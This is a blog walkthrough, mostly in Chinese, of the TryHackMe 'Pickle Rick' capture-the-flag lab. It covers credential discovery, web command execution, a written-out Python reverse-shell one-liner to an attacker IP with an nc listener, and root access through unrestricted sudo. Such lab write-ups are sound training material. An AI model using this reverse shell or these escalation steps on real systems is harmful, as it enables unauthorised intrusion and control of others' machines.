---
title: Tryhackme-easy-Pickle Rick
slug: tryhackmeeasypickle-rick-1vlraf
url: /post/tryhackmeeasypickle-rick-1vlraf.html
date: '2024-08-14 14:08:26+08:00'
lastmod: '2025-05-07 21:28:57+08:00'
toc: true
categories:
  - penetration
isCJKLanguage: true
---

# Tryhackme-easy-Pickle Rick

# 前言

一个简单靶场，kali环境有些小问题，这次是windows下做的

A Rick and Morty CTF. Help turn Rick back into a human!

# 过程

首先给出一个页面

```plain
Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

很明显提示说使用burpsuite

通过抓包得到一条提示信息

```plain
Note to self, remember username!
Username: R1ckRul3s
```

先使用扫描存在的端口，发现存在了两个开放端口

```plain
2024/2/23 23:27:09    开始扫描...
10.10.242.108:22
10.10.242.108:80
```

然后来扫一下目录

```plain
login.php
robots.txt
```

在robots.txt下发现存在字符串，当作密码

```plain
Wubbalubbadubdub
```

login.php尝试登录，登陆后成功跳转portal.php

存在一个可能是命令执行的窗口，ls后查看

```plain
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

访问Sup3rS3cretPickl3Ingred.txt，得到第一个flag

在clue.txt发现一段话

```plain
Look around the file system for the other ingredient.
```

denied.php禁止访问

开始反弹shell

```plain
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.71.162 ",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```plain
nc -nlvp 1234
```

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-RbVJ34EyWQNHPaT-20250507212942-z1wnbo1.png)​

成功反弹后进行提权操作

```plain
sudo -l
```

发现当前甚至没有设置基础密码

```plain
Matching Defaults entries for www-data on ip-10-10-242-108.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-242-108.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

```plain
sudo su
```

成功提权

然后查找相应的两个flag

```plain
cat "second ingredients"
```

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-tmTeXNpjWKaqfEy-20250507212942-3m2rzro.png)​

```plain
cat ./3rd.txt
```

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-H7wTqBGDkIljEb8-20250507212943-hhsc68q.png)​

‍
